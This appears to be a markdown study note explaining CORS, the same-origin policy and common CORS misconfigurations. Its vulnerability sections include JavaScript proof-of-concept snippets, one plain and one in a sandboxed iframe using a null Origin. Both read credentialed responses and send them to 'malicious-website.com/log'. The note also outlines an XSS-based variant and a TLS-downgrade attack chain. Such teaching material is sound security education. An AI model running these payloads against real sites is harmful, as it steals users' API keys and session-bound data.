## Main Headers

```
Origin
Access-Control-Allow-Origin
Access-Control-Allow-Credentials
```

## What is CORS (cross-origin resource sharing)?

- browser mechanism which enables controlled access to resources located outside of a given domain
- extends and adds flexibility to the same-origin policy (SOP)
- not a protection against CSRF
- provides potential for cross-domain attacks

![attack on CORS](../images/attack-on-cors.svg)

## SOP (same-origin policy)

- web browser security mechanism that aims to prevent websites from attacking each other
- restricts scripts on one origin from accessing data from another origin
- origin consists of a URL scheme, domain and port number

eg - `http://normal-website.com/example/example.html`

- `http` - scheme
- `normal-website.com` - domain
- with port 80

| URL accessed                            | Access Permitted?                 |
| --------------------------------------- | --------------------------------- |
| http://normal-website.com/example/      | Yes: same scheme, domain and port |
| http://normal-website.com/example2/     | Yes: same scheme, domain and port |
| https://normal-website.com/example      | No: different scheme and port     |
| http://en.normal-website.com/example    | No: different domain              |
| http://www.normal-website.com/example/  | No: different domain              |
| http://normal-website.com:8080/example/ | No: different port                |

- when browser sends an HTTP request from one origin to another, any cookies including authentication session cookies, relevant to the other domain are also sent as part of the request

- SOP allows embedding of images via `<img>` , media via `<video>` and JS includes with the `<script>` tag and while these external resources can be loaded by the page, any JS on the page won't be able to read the contents of these resources

- There are various exceptions to the same-origin policy

  - some objects are writable but not readable cross-domain such as `location` object or `location.href` property from iframes or new windows
  - some objects are readable but not writable cross-domain such as `length` property of the `window` object and `closed` property
  - can call certain functions cross-domain - eg - `close, blur, focus` on a new window, `postMessage` can be called on iframes and new windows in order to send messages from one domain to another

- due to requirements, SOP is more relaxed when dealing with cookeis, and they are often accessible from all subdomains of a site even though each subdomain is a different origin

## Relaxation of the same-origin policy

- SOP is very restrictive
- many websites interactive with subdomains or third-party sites in a way that requires full cross-origin access
- a controlled relaxation of the SOP is possible using cross-origin resource sharing (CORS)

## Access-Contorl-Allow-Origin

- `Access-Control-Allow-Origin` header - included in the `response` from one website to a request originating from another website and identifies the permitted origin of the request
- web browser compares the `Access-Control-Allow-Origin` with the requesting website's origin and permits access to the response if they match

eg - suppose a website with origin `normal-website.com` causes the following cross-domain request:

```
GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com
```

The server on `robust-website.com` returns the following response:

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
```

- the browser will allow code running on normal-website.com to access the response as the origins match

- The specification of `Access-Control-Allow-Origin` allows for multiple origins or the vaule `null`, or wildcard `*`.

## Access-Control-Allow-Credentials

- default behavior of cross-origin resource requests is for requests to be passed without credentials like cookies and the Authorization header
- but can permit reading of the response when credentials are passed to it by setting the CORS Access-Control-Allow-Credentials header to true.

```
GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=<value>
```

Response to the request is

```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true
```

### Relaxation of CORS specifications with wildcards

- The Header Access-Control-Allow-Origin supports wildcards.
  eg - `Access-Control-Allow-Origin: *`

But you cannot combine the wildcard with the cross-origin trasfer of credentials.

### Pre-flight checks

- when the cross-origin request is preceded by a request using the OPTIONS method, the CORS protocol necessitates an initial check on what methods and headers are permitted prior to allowing the cross-origin request
- the server returns a list of allowed methods in addition to the trusted origin and the browser checks to see if the requesting website's method is allowed

```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```

- response

```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

## Vulnerablities arising from CORS

### Server-generated ACAO header from client-specified Origin header

For example, consider an application that receives the following request:

```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```

It responds with :

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
...
```

- These headers state that access is allowed from the requesting domain and that the cross-origin requests can include cookies.
- If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:

```js
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open("get", "https://vulnerable-website.com/sensitive-victim-data", true);
req.withCredentials = true;
req.send();

function reqListener() {
  location = "//malicious-website.com/log?key=" + this.responseText;
}
```

## Errors parsing Origin headers

- some applications that support access from multiple origins by using whitelist of allowed origins
- if the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header and the access is granted
- mistakes often arise when implementing CORS origin whitelists
  - eg - allow access from all their subdomains including future subdomains not yet in existence
  - allow access from various other organization's domains including their subdomains
- rules are often implemented by matching URL prefixes or suffixes, or using regular expressions

## Whitelisted null origin value

- specification for the origin header supports the value null
- browsers might send the value null in the origin header in various unusual situations

  - cross-origin redirects
  - requests from serialized data
  - request using the file: protocol
  - sandboxed cross-origin requests

- some applications whitelist the null origin to support local development of the application
- eg

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
=============
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

- attacker can use tricks to generate a cross-origin request containing the value null in the Origin header by

```html
<iframe
  sandbox="allow-scripts allow-top-navigation allow-forms"
  src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"
></iframe>
```

## Exploiting XSS via CORS trust relationships

- if a website trusts an origin that is vulnerable to XSS, an attacker could exploit the XSS to inject some JS that use CORS to retrieve sensitive information from the site that trusts the vulnerable application

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
==============
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

- an attacker who finds an XSS vulnerability on subdomain.vulnerable-website.com could use that to retrieve the API key using a URL like

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

## Breaking TLS with poorly configured CORS

- suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP
- eg -

```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
====================
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

- an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the appliation
  - victim user makes any plain HTTP request
  - the attacker injects a redirection to `http://trusted-subdomain.vulnerable-website.com`
  - the victim's browser follows the redirect
  - the attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to `https://vulnerable-website.com`
  - the victim's browser makes the CORS request, including the origin `http://trusted-subdomain.vulnerable-website.com`
  - application allows the request as it is a whitelisted origin, the requested sensitive data is returned in the response
  - the attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control
